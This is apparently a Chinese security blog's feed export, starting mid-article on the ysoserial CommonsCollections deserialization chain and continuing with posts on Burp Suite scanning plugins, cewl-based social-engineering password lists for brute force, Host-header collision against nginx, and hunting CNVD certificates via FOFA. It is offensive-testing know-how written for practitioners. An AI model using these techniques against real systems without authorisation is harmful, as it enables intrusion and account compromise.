function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是AnnotationInvocationHandler这个类是实现了InvocationHandler这个接口的，且AnnotationInvocationHandler类的invoke方法里面是有调用get这个方法的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">var7</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span>(var4.hashCode()) &#123;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1776922004</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">147696667</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1444986633</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230502110518-ol7cqdp.png" alt="image.png"></p><p>所以ysoserial的作者就想到了通过对象代理的方法去调用到这个get，这也是我们在POC的52-57行中看到的第二处与TransformedMap不同的地方。</p><p>运行POC也是可以成功执行命令的</p><p><img src="/assets/image-20230502111639-lmpw1qk.png" alt="image.png"></p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><blockquote><p><a href="https://t.zsxq.com/ZNZrJMZ">https://t.zsxq.com/ZNZrJMZ</a>    &#x2F;&#x2F;p牛java安全漫谈系列</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何打造自己的burpsuite自动化武器库</title>
      <link href="/2023/05/02/%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84burpsuite%E8%87%AA%E5%8A%A8%E5%8C%96%E6%AD%A6%E5%99%A8%E5%BA%93/"/>
      <url>/2023/05/02/%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84burpsuite%E8%87%AA%E5%8A%A8%E5%8C%96%E6%AD%A6%E5%99%A8%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>要问搞渗透必须要打开的一款软件是什么，我猜大多数的师傅都会是burpsuite这款软件，burpsuite的功能十分强大，其也集成了一些漏洞扫描的功能，但是在渗透测试过程中，burpsuite所提供的漏洞扫描功能似乎还是差点感觉，特别是在一些专项的漏洞检测过程中。为了更好的满足我们渗透测试人员的需求，burpsuite是支持插件的扩展的，用户可以自定义一些漏洞检测插件来完善burpsuite的漏洞检测能力，以下就推荐一些我自己个人使用的一些burpsuite插件，其中一些插件也是成功帮助我挖掘到过一些0day（这里另外感谢一下开发这些插件的大佬们）</p><h1 id="0x02-burpsuite武器库"><a href="#0x02-burpsuite武器库" class="headerlink" title="0x02 burpsuite武器库"></a>0x02 burpsuite武器库</h1><p>以下文章主要还是以插件推荐为主，只做一个简单的介绍，具体插件使用展开写篇幅太长，且这些插件使用的难度也都不大，所以师傅们可以自己琢磨一下。</p><p>log4j2burpscanner</p><p>一款被动的log4j2漏洞扫描插件，log4j2这种核弹级的漏洞爆发，互联网存在的log4j2漏洞还是非常之多的，本人自己曾也是借助过这款插件发现过几个0day。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/f0ng/log4j2burpscanner</span><br></pre></td></tr></table></figure><p>BurpShiroPassiveScan</p><p>一款被动的shiro漏洞扫描插件，现在市面上存在许多优秀的shiro漏洞利用图形化工具，但是每次单独打开一个shiro漏洞利用工具都显得非常麻烦，且在shiro指纹识别上，这款插件相比于一些图形化的利用工具更有优势。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/pmiaowu/BurpShiroPassiveScan</span><br></pre></td></tr></table></figure><p>Struts2-RCE</p><p>一款Struts2漏洞扫描插件，集成在bp里面，看到action，do等后缀，都可发送到该插件做一个主动扫描。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/prakharathreya/Struts2-RCE</span><br></pre></td></tr></table></figure><p>FastjsonScan</p><p>BurpFastJsonScan</p><p>两款Fastjson漏洞扫描工具，在Fastjson的漏洞检测中，这两款可以相互结合来检测和验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/Maskhe/FastjsonScan</span><br><span class="line">项目地址：https://github.com/pmiaowu/BurpFastJsonScan</span><br></pre></td></tr></table></figure><p>xia_sql</p><p>一款被动的sql注入辅助测试插件，自己平常测试总是会漏测一些参数，这款插件就完美的解决了测试者懒惰漏测参数的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/smxiazi/xia_sql</span><br></pre></td></tr></table></figure><p>BurpReflectiveXssMiao</p><p>一款反射xss漏洞检测插件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/pmiaowu/BurpReflectiveXssMiao</span><br></pre></td></tr></table></figure><p>BurpJSLinkFinder</p><p>一款基于正则来提取链接插件，该插件可平替jsfinder，这样就可以不用每次单独运行jsfinder了，自己也是利用这款插件挖掘到很多未授权访问的接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/InitRoot/BurpJSLinkFinder</span><br></pre></td></tr></table></figure><p>403 Bypasser一款网页403bypass的插件。<br>直接在BApp Store搜索 403 Bypasser</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><p>Autorize</p><p>一款验证越权漏洞的插件。</p><p>直接在BApp Store搜索 Autorize</p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>Wsdler一款用于辅助测试wsdl接口的插件。<br>直接在BApp Store搜索 Wsdler</p><p><img src="/images/pasted-21.png" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试如何打造社工字典</title>
      <link href="/2023/05/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8/"/>
      <url>/2023/05/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="爬取页面内容"><a href="#爬取页面内容" class="headerlink" title="爬取页面内容"></a>爬取页面内容</h1><p>利用工具：cewl-&gt;(kali)</p><p>参数详解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">-h、 --help：显示帮助。</span><br><span class="line">-k、 --keep：保留下载的文件。</span><br><span class="line">-d&lt;x&gt;，--depth&lt;x&gt;：蜘蛛的深度，默认值为2。</span><br><span class="line">-m、 --min_word_length：最小字长，默认值为3。</span><br><span class="line">-o、 --offsite：让spider访问其他站点。</span><br><span class="line">--exclude：包含要排除的路径列表的文件</span><br><span class="line">--allowed：路径必须匹配才能遵循的正则表达式模式</span><br><span class="line">-w、 --write：将输出写入文件。</span><br><span class="line">-u、 --ua&lt;agent&gt;：要发送的用户代理。</span><br><span class="line">-n、 --o-words：不输出单词列表。</span><br><span class="line">--lowercase：将所有分析的单词小写</span><br><span class="line">--with-numbers：接受带有数字和字母的单词</span><br><span class="line">--convert-umlauts：转换通用ISO-8859-1（拉丁语-1）元音（ä-ae，ö-oe，ü-ue，ß-ss）</span><br><span class="line">-a、 --meta：包含元数据。</span><br><span class="line">--meta_file文件：元数据的输出文件。</span><br><span class="line">-e、 --email：包括电子邮件地址。</span><br><span class="line">--email_file&lt;file&gt;：电子邮件地址的输出文件。</span><br><span class="line">--meta-temp dir&lt;dir&gt;：exiftool在解析文件时使用的临时目录，默认为/tmp。</span><br><span class="line">-c、 --count：显示找到的每个单词的计数。</span><br><span class="line">-v、 --verbose：详细。</span><br><span class="line">--debug：额外的调试信息。</span><br><span class="line"></span><br><span class="line">身份验证</span><br><span class="line">--auth_type：摘要或基本。</span><br><span class="line">--auth_user：身份验证用户名。</span><br><span class="line">--auth_pass：身份验证密码。</span><br><span class="line"></span><br><span class="line">代理服务器支持</span><br><span class="line">--proxy_host：代理主机。</span><br><span class="line">--proxy_port：代理端口，默认为8080。</span><br><span class="line">--proxy_username：代理的用户名（如果需要）。</span><br><span class="line">--proxy_password：代理的密码（如果需要）。</span><br><span class="line"></span><br><span class="line">邮件头</span><br><span class="line"></span><br><span class="line">--header，-H：格式名称：value-可以传递多个。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl url -m 3 -d 3 -e -c -v -w a.txt --with-numbers</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-0.png" alt="upload successful"></p><p><img src="/images/pasted-12.png" alt="upload successful"></p><p>可直接使用爬取出的信息做一个爆破，爆破无果可对之前爬取出信息中无用信息做一个简单剔除，然后再结合人工浏览页面筛选出一些带有社工意义的信息，如姓名，电话，联系方法，公司名称等，这些信息的收集我们也可以通过whois反查结合站点的注册人信息，注册人邮箱等。</p><h1 id="社工字典生成"><a href="#社工字典生成" class="headerlink" title="社工字典生成"></a>社工字典生成</h1><p>利用工具：白鹿社工字典为例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/z3r023/BaiLu-SED-Tool</span><br></pre></td></tr></table></figure><p>对我们之前通过爬取和一起其他手段搜集过来的信息整理号然后把其放入A项结合一些特有弱口令再次生成社工字典</p><p><img src="/images/pasted-14.png" alt="upload successful"></p><p><img src="/images/pasted-16.png" alt="upload successful"></p><p>如果还是无果，我们还可以自己写一个小脚本，去生成用户极有可能设置的社工弱口令然后再与一些常见弱口令进行一个拼接进行爆破。</p><p>该处以姓名：张三为例</p><p>那我们可以写脚本生成如下社工口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zhangsan   //全拼音</span><br><span class="line">zhangs     //全姓简名</span><br><span class="line">zsan       //简姓全名</span><br><span class="line">zs         //简姓简名</span><br><span class="line">张三       //中文名字（还真碰到过用中文作用户名的）</span><br><span class="line">//等等，师傅们发散思维</span><br></pre></td></tr></table></figure><p>可以把我们脚本生成的的社工口令直接进行一个爆破，无果可以再用白鹿社工字典结合一些常见弱口令再次生成社工字典，再次进行爆破。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 社会工程学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC突破边界寻找隐匿资产小技巧（HOSTS碰撞）</title>
      <link href="/2023/04/30/SRC%E7%AA%81%E7%A0%B4%E8%BE%B9%E7%95%8C%E5%AF%BB%E6%89%BE%E9%9A%90%E5%8C%BF%E8%B5%84%E4%BA%A7%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%88HOSTS%E7%A2%B0%E6%92%9E%EF%BC%89/"/>
      <url>/2023/04/30/SRC%E7%AA%81%E7%A0%B4%E8%BE%B9%E7%95%8C%E5%AF%BB%E6%89%BE%E9%9A%90%E5%8C%BF%E8%B5%84%E4%BA%A7%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%88HOSTS%E7%A2%B0%E6%92%9E%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在SRC漏洞挖掘中或者渗透测试中，前期收集好各种WEB应用，开心的打开Burpsuite准备大干一场的时候，发现全是403 404 400 500，于是你开始扫描端口、爆破目录，但是什么都没有信息都没有出来，结果灰溜溜的关闭了浏览器和你的Burpsuite。作为安全圈的老混子，碰到这种情况我们该怎么破局呢？</p><h1 id="0x02-HOSTS碰撞"><a href="#0x02-HOSTS碰撞" class="headerlink" title="0x02 HOSTS碰撞"></a>0x02 HOSTS碰撞</h1><p>我们在平常摸鱼中，经常会碰到这样一种情况，直接利用ip访问显示的是403 404 400 500，但是用域名请求就会返回正常业务。当然在排除WAF作祟下（有一些WAF它会要求使用域名访问，使用IP的会出现WAF的拦截界面），我们就可以利用hosts碰撞技术来尝试一下是否能突破边界。</p><h1 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h1><p>漏洞产生的根本还是源于配置不当，一些系统配置了内网访问，但是由于配置不当的话，例nginx配置不当，或者nignx default_server没有配置或者配置内网，那么内网的业务可能存在被传出的风险。</p><h1 id="0x04-漏洞利用步骤"><a href="#0x04-漏洞利用步骤" class="headerlink" title="0x04 漏洞利用步骤"></a>0x04 漏洞利用步骤</h1><p>一、收集目标的域名和IP作为字典</p><p>可使用一些工具如oneforall</p><p><img src="/images/pasted-1.png" alt="upload successful"></p><p>也可结合其他工具，搜集的域名和IP越详细越好</p><p>二、利用脚本碰撞</p><p>脚本地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fofapro/Hosts_scan</span><br></pre></td></tr></table></figure><p>将搜集到的域名和IP分别放入hosts.txt 和 ip.txt</p><h1 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h1><p>搭建环境</p><p>安装nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]<span class="comment"># yum install -y epel-release</span></span><br><span class="line">[root@localhost etc]<span class="comment"># yum -y update</span></span><br><span class="line">[root@localhost etc]<span class="comment"># yum install -y nginx</span></span><br></pre></td></tr></table></figure><p>配置漏洞环境</p><p>1、设置反向代理</p><p>这里用apache模拟反向代理端口（实际上应该还要创建一个网卡去模拟内网端口，为了省事就模拟一下端口吧），为了防止端口与nginx冲突，我们修改为8000端口。</p><p>2、限制IP访问</p><p>配置文件位置&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>替换配置文件中的http部分如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">  include /etc/nginx/conf.d/*.conf;</span><br><span class="line">  # 限制IP访问</span><br><span class="line">  server &#123;</span><br><span class="line">    listen 80 default;</span><br><span class="line">    server_name _;</span><br><span class="line">    return 403;</span><br><span class="line">    &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">          listen       80;</span><br><span class="line">          server_name  www.test.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">              #反向代理  </span><br><span class="line">              proxy_pass http://192.168.178.143:8000;</span><br><span class="line">              index  index.html index.htm index.jsp;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置好访问结果如下</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>然后我们修改本地hosts文件，添加一条本地解析</p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>然后使用<a href="http://www.test.com进行访问/">www.test.com进行访问</a></p><p><img src="/images/pasted-9.png" alt="upload successful"></p><p>即可访问到apache默认页面，假设某公司内部系统也错误配置，我们即可访问到该公司的内部系统。</p><p>3、脚本复现</p><p>下载脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fofapro/Hosts_scan</span><br></pre></td></tr></table></figure><p>把收集过来的域名和IP分别存入hosts.txt 和 ip.txt</p><p>然后运行脚本</p><p><img src="/images/pasted-10.png" alt="upload successful"></p><p>可以看到碰撞成功的结果</p><h1 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h1><blockquote><p><a href="http://r3start.net/wp-content/uploads/2019/08/2019080916135087.pdf">http://r3start.net/wp-content/uploads/2019/08/2019080916135087.pdf</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> SRC </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD原创证书获取姿势</title>
      <link href="/2023/04/30/CNVD%E5%8E%9F%E5%88%9B%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/04/30/CNVD%E5%8E%9F%E5%88%9B%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>挖CNVD证书是在准备出去实习的时候，想着挖个CNVD证书丰富一下自己的简历，再到后来挖CNVD证书完全是因为众测实在是太卷了，出洞率低，重洞率高，导致自己经常挖完众测之后就emo，然后去挖CNVD找一些存在感。很多师傅感觉挖CNVD证书很难，要挖掘0day出来。确实，要挖0day，听起来确实是挺困难的，但是挖CNVD证书不像是众测有限定的资产，互联网上存在的系统数不胜数，我们只需要利用一些小技巧，找到满足发放证书的系统，然后在这里面去寻找相对薄弱的系统来进行挖掘，这样相对来说挖掘到证书的概率还是相对来说大上不少的。到写文章为止，除去还有几份未审核完的报告，我自己是存在4张CNVD证书的。在证书挖掘过程中，自己并未太刻意深入的去挖掘，非要说刻意去干的一件事还是在寻找CNVD证书发放条件的资产上。以下就总结一下自己挖掘CNVD证书的小技巧，希望对师傅们以后挖掘CNVD证书有所帮助。</p><h1 id="0x02-概览"><a href="#0x02-概览" class="headerlink" title="0x02 概览"></a>0x02 概览</h1><p>大致画了个思维导图（感觉不清楚的，可以加我微信，我发原图给师傅）<br><img src="/images/pasted-5.png" alt="upload successful"></p><h1 id="0x03-证书获取条件"><a href="#0x03-证书获取条件" class="headerlink" title="0x03 证书获取条件"></a>0x03 证书获取条件</h1><p>条件一：通用漏洞（网上没有记录—0day）</p><p>条件二：公司注册资金超过5000万</p><p>条件三：所提交漏洞获得中危及中危以上评分</p><p>条件四：互联网可复现案例需要三例（建议多放几例，防止审核过程中存在案例失效，我一般放10）</p><p>or</p><p>事件型漏洞必须是三大运营商（移动、联通、电信）的中高危漏洞，或者党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞才会颁发原创漏洞证书</p><h1 id="0x04-白盒挖掘"><a href="#0x04-白盒挖掘" class="headerlink" title="0x04 白盒挖掘"></a>0x04 白盒挖掘</h1><p>自己最初挖CNVD的时候是采用白盒的方式来挖取的，什么是白盒，就是找一些开源的系统，直接去审计代码，但是慢慢我在尝试挖掘的过程中发现一件尴尬的事。遇到小型的系统（厂商），挖掘出来漏洞，但是不满足证书发放的条件。遇到中型的系统（厂商），会碰到一些扯皮的厂商，说是开源项目，不在管辖范围中之内（翻译一下就是你们用的我开源的产品，没收你们钱，出了问题是你们自己的事）</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p>哎，格局呢。遇到大型的系统（厂商），其对代码审计的能力要求比较高，所以比较难审计出洞，所以慢慢的后面我就改变思路改为黑盒挖去了。那为什么还要写白盒挖取这个，是因为有一些代码审计能力比较强的师傅，可以考虑一下这种挖掘方式，毕竟白盒的挖掘方式比黑盒更容易出洞。</p><h1 id="0x05-黑盒挖掘"><a href="#0x05-黑盒挖掘" class="headerlink" title="0x05 黑盒挖掘"></a>0x05 黑盒挖掘</h1><p>主要还是写写黑盒挖掘，自己的证书也全是黑盒挖掘过来的。那在挖掘CNVD证书的过程中，我认为最重要的一部分还是在选择挖掘目标上面。那怎么样去寻找满足发放证书条件的目标呢，以下有三个方法。</p><p>① 利用空间测绘寻找</p><p>② 利用脚本寻找</p><p>③ 在CNVD官网寻找</p><p>首先来讲讲第一个方法：利用空间测绘，这里以fofa为例</p><p>我们可以搜索一些常见的系统可能使用的名称，比如说”管理系统”、”登录系统”、”某某平台”等等</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p>还可以利用组合语法如一些常见登录系统会使用到的一些js文件，css文件等去进行寻找,比如</p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>然后找到这些系统之后，看看归属于哪个公司，判断其归属于哪个公司，最好用的方法就是，在这种技术支持上去看是属于哪个公司</p><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>当然也有一些系统是没有这种技术支持的，这个时候我们就需要一些其他的方法去判断其归属于哪个公司，有源代码中有注释的，有进后台发现某某公司开发的，反正找归属是个细心活，没有太多的技巧。找到归属于哪一个公司之后的话，我们就可以利用爱企查等查企业信息等网址对该公司做一个查询，看看其注册资产</p><p><img src="/images/pasted-15.png" alt="upload 